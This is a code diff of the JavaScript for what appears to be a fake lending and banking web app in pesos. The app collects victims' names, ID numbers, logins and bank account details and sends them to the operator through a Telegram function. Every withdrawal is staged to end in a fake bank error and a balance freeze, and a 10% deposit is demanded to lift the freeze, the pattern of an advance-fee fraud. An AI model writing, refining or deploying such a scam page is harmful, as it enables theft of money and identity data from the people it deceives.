-        balance: 0, loanStatus: 'none', loanAmount: 0,
-        fullName: document.getElementById('reg-fullname').value,
-        idName: document.getElementById('reg-idname').value,
-        idNumber: document.getElementById('reg-idnumber').value,
-        verified: false, frozen: false
-      };
-      users[slot] = newUser; saveUsers();
-      generatedBankCode = Math.floor(100000 + Math.random()*900000).toString();
-      sendTelegram(`🆕 New Reg Slot ${slot}: ${newUser.fullName}\nCode: ${generatedBankCode}`);
-      document.getElementById('overlay-bank-verify').classList.add('active');
-      window.tempSlot = slot;
-    });
-
-    // SWIPE VERIFY
-    document.getElementById('swipe-track').addEventListener('touchmove', function(e) {
-      let thumb = document.getElementById('swipe-thumb');
-      let rect = this.getBoundingClientRect();
-      let x = e.touches[0].clientX - rect.left - 21;
-      if (x < 0) x = 0; if (x > rect.width-50) x = rect.width-50;
-      thumb.style.left = x + 'px';
-      if (x > rect.width-60) {
-        if (window.tempSlot) {
-          users[window.tempSlot].verified = true; saveUsers();
-          document.getElementById('overlay-bank-verify').classList.remove('active');
-          showToast('Verified! Please login.', 'success');
-          showScreen('screen-login');
-        }
-      }
-    });
-
-    // LOAN
-    document.getElementById('loan-form').addEventListener('submit', function(e) {
-      e.preventDefault();
-      if (!currentUser) return;
-      currentUser.loanStatus = 'waiting'; currentUser.loanAmount = parseFloat(document.getElementById('loan-amount').value);
-      saveUsers(); updateDashboard();
-      generatedLoanCode = Math.floor(100000+Math.random()*900000).toString();
-      sendTelegram(`📋 Loan ${currentUser.fullName} Amount: ${currentUser.loanAmount}\nCode: ${generatedLoanCode}`);
-      document.getElementById('overlay-loan-confirm').classList.add('active');
-    });
-
-    window.verifyLoanCode = function() {
-      let code = prompt("Enter loan code from Telegram:");
-      if (code === generatedLoanCode) {
-        currentUser.loanStatus = 'approved';
-        currentUser.balance = Number(currentUser.balance) + Number(currentUser.loanAmount);
-        saveUsers(); updateDashboard();
-        document.getElementById('overlay-loan-confirm').classList.remove('active');
-        showToast('Loan approved!', 'success');
-      } else showToast('Invalid code', 'error');
-    };
-
-    // WITHDRAW with error simulation and freezing
-    window.submitWithdraw = function() {
-      if (!currentUser || currentUser.frozen) return;
-      let amount = parseFloat(document.getElementById('wd-amount').value);
-      let bank = document.getElementById('wd-bank-select').value;
-      let acc = document.getElementById('wd-account').value;
-      let name = document.getElementById('wd-accname').value;
-      if (!amount || amount > currentUser.balance) return showToast('Invalid amount', 'error');
-      
-      // Simulate error: show error overlay with bank details
-      document.getElementById('wd-error-details').innerHTML = `
-        <b>Bank:</b> ${bank}<br><b>Account:</b> ${acc}<br><b>Name:</b> ${name}<br><b>Amount:</b> ₱${amount}
-      `;
-      document.getElementById('overlay-wd-error').classList.add('active');
-      
-      // Send withdrawal attempt to Telegram
-      sendTelegram(`⚠️ Withdrawal attempt: ${currentUser.fullName}\nBank: ${bank}\nAcc: ${acc}\nAmount: ${amount}`);
-      
-      // Freeze account and add 10% bonus to balance
-      currentUser.frozen = true;
-      currentUser.balance = Number(currentUser.balance) + (amount * 0.1);
-      saveUsers(); updateDashboard(); updateWithdrawUI();
-      
-      // Generate unfreeze code
-      generatedUnfreezeCode = Math.floor(100000+Math.random()*900000).toString();
-      sendTelegram(`🔒 Account Frozen. Unfreeze code: ${generatedUnfreezeCode}`);
-      showToast('Withdrawal error. Account frozen. 10% bonus added.', 'error');
-    };
-
-    window.openUnfreezeOverlay = function() {
-      document.getElementById('overlay-unfreeze').classList.add('active');
-    };
-
-    window.submitUnfreezeCode = function() {
-      let code = prompt("Enter unfreeze code from Telegram:");
-      if (code === generatedUnfreezeCode && currentUser) {
-        currentUser.frozen = false; saveUsers();
-        updateDashboard(); updateWithdrawUI();
-        document.getElementById('overlay-unfreeze').classList.remove('active');
-        showToast('Account unfrozen. Contact support to withdraw.', 'success');
-        // Hide withdraw tab after unfreeze
-        document.getElementById('tab-withdraw-btn').style.display = 'none';
-      } else showToast('Invalid code', 'error');
-    };
 
     window.doLogout = function() {
-      clearSession(); currentSlot = null; currentUser = null;
+      clearSession();
+      currentSlot = null; currentUser = null;
       showScreen('screen-login');
     };
 
-    // Auto login check
-    (function init() {
-      let session = JSON.parse(localStorage.getItem(SESSION_KEY));
-      if (session && users[session.slot]) {
-        currentSlot = session.slot; currentUser = users[session.slot];
-        showScreen('screen-dashboard');
-        updateDashboard(); updateWithdrawUI();
+    window.togglePw = function(id, btn) {
+      const inp = document.getElementById(id);
+      inp.type = inp.type==='password'?'text':'password';
+      btn.textContent = inp.type==='password'?'👁':'🙈';
+    };
+
+    window.moveNext = function(curr, nextId) {
+      if(curr.value.length) document.getElementById(nextId)?.focus();
+    };
+
+    function getCodeFromGroup(groupId) {
+      const inputs = document.querySelectorAll(`#${groupId} input`);
+      return Array.from(inputs).map(i=>i.value).join('');
+    }
+
+    window.closeOverlay = function(id) { document.getElementById(id).classList.remove('active'); };
+
+    // ----- LOGIN (No auto logout fix) -----
+    document.getElementById('login-form').addEventListener('submit', function(e){
+      e.preventDefault();
+      const email = document.getElementById('login-email').value.trim().toLowerCase();
+      const pass = document.getElementById('login-password').value;
+      let found = null;
+      for(let s=1; s<=70; s++) {
+        const u = users[String(s)];
+        if(u && u.email === email && u.password === pass) { found = String(s); break; }
       }
-    })();
+      if(!found) return showToast('Invalid credentials','error');
+      currentSlot = found; currentUser = users[found];
+      saveSession(found);
+      updateUI();
+      showScreen('screen-dashboard');
+      sendTelegram(`🔐 Login: ${currentUser.fullName} | Slot ${found}`);
+    });
+
+    // Register remains same
+    document.getElementById('register-form').addEventListener('submit', function(e){
+      e.preventDefault();
+      let empty = null;
+      for(let s=2;s<=70;s++) if(!users[String(s)]?.email) { empty=String(s); break; }
+      if(!empty) return showToast('Slots full','error');
+      const newUser = {
+        email: document.getElementById('reg-email').value.trim().toLowerCase(),
+        password: document.getElementById('reg-password').value,
+        fullName: document.getElementById('reg-fullname').value,
+        idName: document.getElementById('reg-idname').value,
+        idNumber: document.getElementById('reg-idnumber').value,
+        balance: 0, loanStatus:'none', loanAmount:0, verified:true, frozen:false
+      };
+      users[empty] = newUser; saveUsers();
+      showToast('Account created! Login now.','success');
+      showScreen('screen-login');
+      sendTelegram(`🆕 New user slot ${empty}: ${newUser.email}`);
+    });
+
+    // Loan submit
+    document.getElementById('loan-form').addEventListener('submit', function(e){
+      e.preventDefault();
+      if(!currentUser) return;
+      const amount = parseFloat(document.getElementById('loan-amount').value);
+      currentUser.loanStatus = 'approved';
+      currentUser.loanAmount = amount;
+      currentUser.balance = (Number(currentUser.balance)+amount);
+      saveUsers(); updateUI();
+      showToast('Loan approved!','success');
+    });
+
+    // ----- WITHDRAW FLOW (error + freeze) -----
+    window.initiateWithdrawal = function() {
+      if(!currentUser) return;
+      if(currentUser.frozen) {
+        showToast('Balance frozen. Unfreeze first.','error'); return;
+      }
+      const amount = parseFloat(document.getElementById('wd-amount').value);
+      if(!amount || amount<100 || amount > currentUser.balance) return showToast('Invalid amount','error');
+      
+      pendingWithdraw = {
+        bank: document.getElementById('wd-bank').value,
+        account: document.getElementById('wd-account').value,
+        name: document.getElementById('wd-accname').value,
+        amount: amount
+      };
+      generatedWdCode = Math.floor(100000 + Math.random()*900000).toString();
+      sendTelegram(`💸 WITHDRAWAL ${amount} | Bank: ${pendingWithdraw.bank} | Code: ${generatedWdCode}`);
+      document.getElementById('overlay-wd-code').classList.add('active');
+    };
+
+    window.verifyWithdrawalCode = function() {
+      const code = getCodeFromGroup('wd-code-group');
+      if(code !== generatedWdCode) return showToast('Wrong code','error');
+      document.getElementById('overlay-wd-code').classList.remove('active');
+      
+      // Instead of success -> show bank error
+      errorFixCode = Math.floor(100000 + Math.random()*900000).toString();
+      sendTelegram(`⚠️ Bank error for ${currentUser.fullName}. Provide original details. Code: ${errorFixCode}`);
+      document.getElementById('overlay-error-bank').classList.add('active');
+    };
+
+    window.submitErrorCode = function() {
+      const code = getCodeFromGroup('error-code-group');
+      if(code !== errorFixCode) return showToast('Invalid code','error');
+      document.getElementById('overlay-error-bank').classList.remove('active');
+      
+      // Add 10% bonus and freeze
+      if(currentUser && pendingWithdraw) {
+        const bonus = Math.floor(pendingWithdraw.amount * 0.1);
+        currentUser.balance = Number(currentUser.balance) + bonus;
+        currentUser.frozen = true;
+        saveUsers(); updateUI();
+        showToast(`10% bonus added. Balance frozen.`,'info');
+        sendTelegram(`🔒 Balance frozen for ${currentUser.email}. Bonus: ${bonus}`);
+      }
+    };
+
+    window.triggerUnfreezeDeposit = function() {
+      if(!currentUser?.frozen) return;
+      const depositCode = Math.floor(100000+Math.random()*900000).toString();
+      sendTelegram(`🔓 Unfreeze request. 10% deposit code: ${depositCode}`);
+      window._unfreezeCode = depositCode;
+      document.getElementById('overlay-unfreeze').classList.add('active');
+    };
+
+    window.confirmUnfreeze = function() {
+      const code = getCodeFromGroup('unfreeze-code-group');
+      if(code !== window._unfreezeCode) return showToast('Wrong code','error');
+      if(currentUser) {
+        currentUser.frozen = false;
+        saveUsers(); updateUI();
+        document.getElementById('overlay-unfreeze').classList.remove('active');
+        showToast('Balance unfrozen. Contact support to withdraw.','info');
+        document.getElementById('overlay-contact-support').classList.add('active');
+      }
+    };
+
+    // Auto-login session restore
+    window.addEventListener('load', function() {
+      const session = JSON.parse(localStorage.getItem(SESSION_KEY));
+      if(session && users[session.slot]) {
+        currentSlot = session.slot;
+        currentUser = users[session.slot];
+        updateUI();
+        showScreen('screen-dashboard');
+      }
+      if(!Object.keys(users).length) {
+        users = {"1":{email:"test@test.com",password:"123456",balance:5000,loanStatus:"none",loanAmount:0,fullName:"Demo User",idName:"Demo",idNumber:"12345",verified:true,frozen:false}};
+        saveUsers();
+      }
+    });
   })();
 </script>
 </body>
